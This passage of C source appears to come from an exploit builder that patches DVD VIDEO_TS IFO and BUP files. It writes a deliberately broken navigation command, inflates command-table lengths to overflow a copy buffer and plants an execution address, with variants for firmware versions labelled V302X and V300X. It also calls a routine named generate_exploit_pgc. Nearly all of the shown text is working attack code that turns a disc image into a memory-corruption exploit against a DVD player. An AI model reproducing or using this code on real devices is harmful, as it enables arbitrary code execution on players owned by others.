    fseek(fp, 0x810, SEEK_SET);
    if (fwrite("\x00\x00\x00\x38", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x81c, SEEK_SET);
    if (fwrite("\x00\x00\x02\x44", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x828, SEEK_SET);
    if (fwrite("\x00\x00\x04\x50", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x834, SEEK_SET);
    if (fwrite("\x00\x00\x06\x5c", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 57343, SEEK_SET);
    if (fwrite("\x00", 1, 1, fp) != 1) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
#endif

    fclose(fp);
#elif V302X
    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET);
    printf("NEEDED_LEN: %x\n", NEEDED_LEN_I2);
    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET_I2);
    printf("NEEDED_LEN: %x\n", NEEDED_LEN_I3);
    printf("INITIAL_COPY_BUF_TARGET: %x\n", INITIAL_COPY_BUF_TARGET_I3);
    printf("VOB_PATCH_0_LOC: %x\n", VOB_PATCH_0_LOC);

    uint8_t ifo_patch_buf[16] = {
        0, 0, // CMDT_PRE_CNT
        0, 0, // CMDT_POST_CNT
        0, 0, // CMDT_CELL_CNT
        0, 15, // CMDT_EA
        0, 48, 0, 0, 0, 0, 0, 0 // BROKEN_CMD
    };

    uint32_t tmp = MAX(NEEDED_LEN_I3 / 8, 1);
    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
    ifo_patch_buf[1] = tmp & 0xff;

    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
        return -1;
    }
    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite(ifo_patch_buf, 1, 6, fp) != 6) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
    fclose(fp);
    
    tmp = MAX(NEEDED_LEN_I2 / 8, 1);
    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
    ifo_patch_buf[1] = tmp & 0xff;

    fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n");
        return -1;
    }
    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite(ifo_patch_buf, 1, 6, fp) != 6) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fclose(fp);

    tmp = MAX(NEEDED_LEN / 8, 1);
    ifo_patch_buf[0] = (tmp >> 8) & 0xff;
    ifo_patch_buf[1] = tmp & 0xff;

    fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n");
        return -1;
    }

    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite(ifo_patch_buf, 1, 16, fp) != 16) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, IFO_PGC_CAT_PATCH_LOC, SEEK_SET);

    ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
    ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
    ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
    ifo_patch_buf[3] = EXEC_ADDR & 0xff;
    
    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fclose(fp);
#elif V300X
    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
        fprintf(stderr, "Error: Failed to generate exploit PGC\n");
        return -1;
    }

    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
        return -1;
    }
    fseek(fp, IFO_PGC_PATCH_LOC, SEEK_SET);
    if (fwrite(NEW_PGC_SECT, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
    fclose(fp);
#endif

    puts("OK");
    return 0;
}
